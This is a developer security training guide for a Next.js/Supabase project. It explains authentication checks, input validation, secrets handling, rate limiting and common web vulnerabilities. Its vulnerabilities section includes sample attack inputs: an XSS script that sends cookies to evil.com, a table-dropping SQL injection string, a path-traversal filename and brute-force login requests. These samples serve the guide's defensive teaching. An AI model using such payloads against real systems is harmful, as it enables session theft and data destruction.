# Security Training for Sageloop Developers

Welcome to Sageloop! This guide will help you understand our security practices and avoid common vulnerabilities.

## Table of Contents

1. [Security Overview](#security-overview)
2. [Quick Start Security Checklist](#quick-start-security-checklist)
3. [Authentication & Authorization](#authentication--authorization)
4. [Input Validation](#input-validation)
5. [Secrets Management](#secrets-management)
6. [Common Vulnerabilities & How to Prevent Them](#common-vulnerabilities--how-to-prevent-them)
7. [Security Tools](#security-tools)
8. [Getting Help](#getting-help)

---

## Security Overview

Sageloop follows security best practices based on:

- **OWASP Top 10** - Most critical web application security risks
- **SUSVIBES Research** - Academic research on AI-generated code security
- **CWE/SANS Top 25** - Most dangerous software weaknesses

### Our Security Posture

✅ **159 Security Tests** - 100% passing
✅ **Automated Secrets Scanning** - GitHub Actions + local pre-commit
✅ **Row Level Security** - Database-level access control
✅ **Rate Limiting** - Prevent abuse and DoS attacks
✅ **Input Validation** - All user inputs validated with Zod
✅ **Output Sanitization** - All user content sanitized before rendering
✅ **Encrypted Secrets** - API keys encrypted at rest (pgcrypto)
✅ **Security Headers** - CSP, HSTS, X-Frame-Options, etc.

---

## Quick Start Security Checklist

Before writing any code, understand these **5 Golden Rules**:

### 1. ✅ Always Check Authentication

```typescript
// REQUIRED for all protected API routes
export async function POST(request: Request) {
  const supabase = await createServerClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();

  if (!user) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // Your code here
}
```

### 2. ✅ Always Validate Input

```typescript
// REQUIRED for all API routes that accept user data
import { createProjectSchema } from "@/lib/validation/schemas";

export async function POST(request: Request) {
  const body = await request.json();
  const validatedData = createProjectSchema.parse(body);
  // Use validatedData (type-safe and validated)
}
```

### 3. ✅ Always Use RLS-Protected Client

```typescript
// CORRECT: Use createServerClient() for user queries
const supabase = await createServerClient();
const { data } = await supabase.from("projects").select("*");

// WRONG: Never use supabaseAdmin for user queries
// const { data } = await supabaseAdmin.from('projects').select('*');
```

### 4. ✅ Always Apply Rate Limiting

```typescript
// REQUIRED for all API routes (especially expensive operations)
import { withRateLimit, RATE_LIMITS } from "@/lib/security/rate-limit";

export const POST = withRateLimit(async (request: Request) => {
  // Your handler
}, RATE_LIMITS.api);
```

### 5. ✅ Always Use env Module for Secrets

```typescript
// CORRECT: Use env module
import { env } from "@/lib/env";
const apiKey = env.openai.apiKey;

// WRONG: Never use process.env directly
// const apiKey = process.env.OPENAI_API_KEY;
```

---

## Authentication & Authorization

### Understanding Our Auth System

Sageloop uses **Supabase Auth** with **Row Level Security (RLS)**:

```
User Signs Up
    ↓
Personal Workbench Created Automatically
    ↓
User Can Create Projects in Their Workbench
    ↓
RLS Ensures User Can Only Access Their Data
```

### Authentication Pattern

**Every protected API route must check authentication**:

```typescript
import { createServerClient } from "@/lib/supabase";
import { NextResponse } from "next/server";

export async function POST(request: Request) {
  // Step 1: Get authenticated Supabase client
  const supabase = await createServerClient();

  // Step 2: Check if user is authenticated
  const {
    data: { user },
  } = await supabase.auth.getUser();

  if (!user) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // Step 3: User is authenticated, proceed
  // RLS automatically filters queries by user's workbenches
  const { data: projects } = await supabase.from("projects").select("*");

  return NextResponse.json({ data: projects });
}
```

### Authorization with RLS

**Row Level Security (RLS)** automatically filters database queries:

```typescript
// This query automatically filters by user's workbenches
const { data: projects } = await supabase.from("projects").select("*");

// User A sees only their projects
// User B sees only their projects
// No way to see each other's data
```

### Common Auth Mistakes

#### ❌ MISTAKE 1: No Authentication Check

```typescript
// WRONG: Anyone can access this!
export async function DELETE(request: Request) {
  await supabase.from("projects").delete().eq("id", projectId);
}
```

**Fix**: Add auth check:

```typescript
// CORRECT
export async function DELETE(request: Request) {
  const supabase = await createServerClient();
  const {
    data: { user },
  } = await supabase.auth.getUser();

  if (!user) {
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  // RLS ensures user can only delete their projects
  await supabase.from("projects").delete().eq("id", projectId);
}
```

#### ❌ MISTAKE 2: Using Admin Client

```typescript
// WRONG: Bypasses RLS, exposes all data!
import { supabaseAdmin } from "@/lib/supabase/admin";

const { data } = await supabaseAdmin.from("projects").select("*");
// Returns ALL projects from ALL users!
```

**Fix**: Use regular client:

```typescript
// CORRECT
const supabase = await createServerClient();
const { data } = await supabase.from("projects").select("*");
// Returns only user's accessible projects
```

---

## Input Validation

### Why Validate Input?

**Without validation**:

- Users can send 1MB strings → **Resource exhaustion**
- Users can send negative numbers → **Logic errors**
- Users can send SQL/HTML → **Injection attacks**

### Validation with Zod

We use **Zod** for runtime validation:

```typescript
import { createProjectSchema } from "@/lib/validation/schemas";
import { z } from "zod";

export async function POST(request: Request) {
  const body = await request.json();

  try {
    // Parse and validate
    const validatedData = createProjectSchema.parse(body);

    // validatedData is now:
    // 1. Type-safe (TypeScript knows the shape)
    // 2. Validated (lengths checked, types correct)
    // 3. Sanitized (optional transformations applied)

    const { name, description, model_config } = validatedData;
  } catch (error) {
    if (error instanceof z.ZodError) {
      return NextResponse.json(
        {
          error: "Invalid request data",
          details: error.issues, // Helpful error messages
        },
        { status: 400 },
      );
    }
  }
}
```

### Validation Schemas

All schemas are in [lib/validation/schemas.ts](../../lib/validation/schemas.ts):

| Schema                 | Purpose          | Key Limits                                   |
| ---------------------- | ---------------- | -------------------------------------------- |
| `createProjectSchema`  | Create project   | name ≤ 100 chars, description ≤ 500 chars    |
| `createScenarioSchema` | Create scenario  | input_text ≤ 10,000 chars                    |
| `createRatingSchema`   | Rate output      | stars 1-5, feedback ≤ 5,000 chars, ≤ 10 tags |
| `retestSchema`         | Retest scenarios | ≥ 1 scenario, improvement_note ≤ 1,000 chars |

### Creating New Validation Schemas

When adding a new API endpoint:

```typescript
// 1. Define schema in lib/validation/schemas.ts
export const createMyFeatureSchema = z.object({
  title: z.string().min(1).max(200),
  count: z.number().int().min(1).max(100),
  tags: z.array(z.string().max(50)).max(10),
});

// 2. Use schema in API route
import { createMyFeatureSchema } from "@/lib/validation/schemas";

export async function POST(request: Request) {
  const body = await request.json();
  const validatedData = createMyFeatureSchema.parse(body);
  // Safe to use!
}
```

### Common Validation Mistakes

#### ❌ MISTAKE: No Validation

```typescript
// WRONG: No limits!
export async function POST(request: Request) {
  const { text } = await request.json();
  // text could be 1MB string → resource exhaustion!
}
```

**Fix**: Add validation:

```typescript
// CORRECT
const schema = z.object({
  text: z.string().max(10000),
});

const validatedData = schema.parse(body);
```

---

## Secrets Management

### Environment Variables

We have **two types** of environment variables:

| Type       | Prefix         | Exposure        | Usage                         |
| ---------- | -------------- | --------------- | ----------------------------- |
| **Public** | `NEXT_PUBLIC_` | ✅ Browser-safe | Public URLs, publishable keys |
| **Secret** | None           | ❌ Server-only  | API keys, service role keys   |

### Using Environment Variables

**ALWAYS use the `env` module**:

```typescript
// ✅ CORRECT: Type-safe, validated
import { env } from "@/lib/env";

const openaiKey = env.openai.apiKey; // Optional, may be undefined
const supabaseUrl = env.supabase.url; // Required, throws if missing
const serviceKey = env.supabase.serviceRoleKey; // Secret, server-only

// ❌ WRONG: Not type-safe, no validation
const openaiKey = process.env.OPENAI_API_KEY;
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
```

### Adding New Environment Variables

1. **Add to `.env.local`** (your personal file, never committed):

   ```bash
   MY_NEW_SECRET=abc123
   ```

2. **Add to `lib/env.ts`**:

   ```typescript
   const requiredEnvVars = [
     // ... existing
     "MY_NEW_SECRET",
   ] as const;

   export const env = {
     // ... existing
     myService: {
       secret: process.env.MY_NEW_SECRET!,
     },
   };
   ```

3. **Document in `.env.example`**:
   ```bash
   # My Service - Get from https://example.com/settings
   MY_NEW_SECRET=your-secret-here
   ```

### Secrets Best Practices

#### ✅ DO: Mask Secrets in Logs

```typescript
const maskApiKey = (key: string): string => {
  if (key.length < 10) return "***";
  return key.slice(0, 7) + "..." + key.slice(-4);
};

console.log("Using API key:", maskApiKey(apiKey));
// Output: "sk-proj...3456"
```

#### ✅ DO: Return Boolean Flags, Not Keys

```typescript
// CORRECT: Client sees if keys are configured
return NextResponse.json({
  openai: !!apiKeys.openai_key,
  anthropic: !!apiKeys.anthropic_key,
});
```

#### ❌ DON'T: Log Full Secrets

```typescript
// WRONG: Full key in logs!
console.log("API Key:", apiKey);

// WRONG: Full key in error messages!
throw new Error(`Failed with key: ${apiKey}`);
```

#### ❌ DON'T: Hardcode Secrets

```typescript
// WRONG: Hardcoded in source!
const OPENAI_KEY = "sk-proj-abc123...";

// WRONG: Hardcoded in comments!
// Using key sk-proj-abc123...
```

### Checking for Secrets Before Committing

**ALWAYS run secrets scan before committing**:

```bash
# Scan staged files
npm run security:secrets

# Scan all files
npm run security:secrets:all
```

If secrets are detected:

1. **Remove the secret** from code
2. **Add to `.env.local`** instead
3. **Update `.env.example`** with placeholder
4. **Revoke the leaked secret** if already committed

---

## Common Vulnerabilities & How to Prevent Them

### 1. Cross-Site Scripting (XSS)

**What it is**: Attacker injects malicious JavaScript into your app.

**Example Attack**:

```html
<script>
  // Steal user's session token
  fetch("https://evil.com/steal?token=" + document.cookie);
</script>
```

**How to Prevent**:

```typescript
// ✅ CORRECT: Sanitize before rendering
import { sanitize } from '@/lib/security/sanitize';

const safeHtml = sanitize.userContent(userInput);
<div dangerouslySetInnerHTML={{ __html: safeHtml }} />

// ❌ WRONG: No sanitization
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

### 2. SQL Injection

**What it is**: Attacker manipulates database queries.

**Example Attack**:

```sql
-- User input: '; DROP TABLE projects; --
SELECT * FROM projects WHERE id = '1'; DROP TABLE projects; --'
```

**How to Prevent**:

Supabase automatically uses parameterized queries, but always validate input:

```typescript
// ✅ CORRECT: Supabase uses parameterized queries
const { data } = await supabase
  .from("projects")
  .select("*")
  .eq("id", projectId); // Safe, parameterized

// ✅ CORRECT: Validate input first
const validatedId = z.number().int().positive().parse(projectId);
```

### 3. Brute Force Attacks

**What it is**: Attacker tries many passwords to guess credentials.

**Example Attack**:

```
POST /api/auth/login
{ "email": "user@example.com", "password": "password1" }

POST /api/auth/login
{ "email": "user@example.com", "password": "password2" }

... (thousands of attempts)
```

**How to Prevent**:

```typescript
// ✅ CORRECT: Apply strict rate limiting to auth endpoints
import { withRateLimit, RATE_LIMITS } from "@/lib/security/rate-limit";

export const POST = withRateLimit(
  async (request: Request) => {
    // Login logic
  },
  RATE_LIMITS.auth, // Only 5 attempts per 15 minutes
);
```

### 4. Resource Exhaustion (DoS)

**What it is**: Attacker sends huge inputs or many requests to crash your app.

**Example Attack**:

```json
{
  "name": "A".repeat(1000000), // 1MB string
  "scenarios": [...Array(10000)] // 10,000 items
}
```

**How to Prevent**:

```typescript
// ✅ CORRECT: Validate input sizes
const schema = z.object({
  name: z.string().max(100),
  scenarios: z.array(z.any()).max(100),
});

// ✅ CORRECT: Apply rate limiting
export const POST = withRateLimit(
  async (request: Request) => {
    // Handler
  },
  RATE_LIMITS.generation, // Only 20 requests per hour
);
```

### 5. Path Traversal

**What it is**: Attacker accesses files outside intended directory.

**Example Attack**:

```
filename: "../../../etc/passwd"
```

**How to Prevent**:

```typescript
// ✅ CORRECT: Sanitize filenames
import { sanitize } from "@/lib/security/sanitize";

const safeFilename = sanitize.filename(userProvidedName);
// "../../../etc/passwd" → "etc-passwd"
```

### 6. Information Exposure

**What it is**: Attacker learns sensitive information from errors/responses.

**Example Attack**:

```json
{
  "error": "User john@example.com not found in database table 'users' on server db-prod-01"
}
// Attacker learns: email exists, table name, server name
```

**How to Prevent**:

```typescript
// ✅ CORRECT: Generic error messages
if (!user) {
  return NextResponse.json({ error: "Invalid credentials" }, { status: 401 });
}

// ❌ WRONG: Detailed errors
if (!user) {
  return NextResponse.json(
    { error: `User ${email} not found in database` },
    { status: 404 },
  );
}
```

---

## Security Tools

### Running Security Checks

```bash
# All security checks (run before every commit)
npm run security:all

# Individual checks
npm run security:scan     # ESLint security rules
npm run security:deps     # Dependency vulnerabilities
npm run security:secrets  # Secrets detection

# Security tests
npm test tests/security/  # All 159 security tests
```

### Pre-Commit Workflow

1. Write your code
2. Run `npm run security:all`
3. Fix any issues
4. Commit

### Tools We Use

| Tool                       | Purpose                           | Command                    |
| -------------------------- | --------------------------------- | -------------------------- |
| **ESLint Security Plugin** | Detect security issues in code    | `npm run security:scan`    |
| **npm audit**              | Check for vulnerable dependencies | `npm run security:deps`    |
| **Gitleaks**               | Detect hardcoded secrets          | `npm run security:secrets` |
| **Vitest**                 | Run security tests                | `npm test tests/security/` |

### Installing Gitleaks (Optional)

Gitleaks is optional for local development (graceful fallback):

```bash
# macOS
brew install gitleaks

# Linux
wget https://github.com/gitleaks/gitleaks/releases/download/v8.18.0/gitleaks-linux-amd64
chmod +x gitleaks-linux-amd64
sudo mv gitleaks-linux-amd64 /usr/local/bin/gitleaks

# Verify
gitleaks version
```

---

## Getting Help

### Resources

1. **Security Checklist**: [docs/security/SECURITY_CHECKLIST.md](./SECURITY_CHECKLIST.md)
2. **CLAUDE.md**: [CLAUDE.md](../../CLAUDE.md) - Development guidelines
3. **Sprint Summaries**:
   - [Sprint 0](./sprint-0-summary.md) - Initial assessment
   - [Sprint 1](./sprint-1-summary.md) - Headers & sanitization
   - [Sprint 2](./sprint-2-summary.md) - Validation & rate limiting
   - [Sprint 3](./sprint-3-summary.md) - Secrets management
   - [Sprint 4](./sprint-4-summary.md) - Documentation

### External Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Next.js Security](https://nextjs.org/docs/app/building-your-application/configuring/security)
- [Supabase Security](https://supabase.com/docs/guides/platform/security)

### Questions?

If you're unsure about security implications:

1. Check the [Security Checklist](./SECURITY_CHECKLIST.md)
2. Ask in team chat/Slack
3. When in doubt, err on the side of caution

### Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT** create a public GitHub issue
2. Email security@ (replace with actual contact)
3. Include details about the vulnerability
4. We'll respond within 24 hours

---

## Testing Your Knowledge

Before writing production code, ensure you can answer:

1. ✅ How do I check if a user is authenticated in an API route?
2. ✅ When should I use `createServerClient()` vs `supabaseAdmin`?
3. ✅ How do I validate user input?
4. ✅ How do I apply rate limiting to an API route?
5. ✅ How do I access environment variables securely?
6. ✅ How do I sanitize user-generated HTML?
7. ✅ What should I do if I accidentally commit a secret?
8. ✅ How do I prevent XSS attacks?
9. ✅ How do I prevent SQL injection?
10. ✅ How do I mask API keys in logs?

If you can't answer all of these, review this document again.

---

**Welcome to secure development at Sageloop! 🔒**

_Last Updated: December 18, 2025 (Sprint 4)_
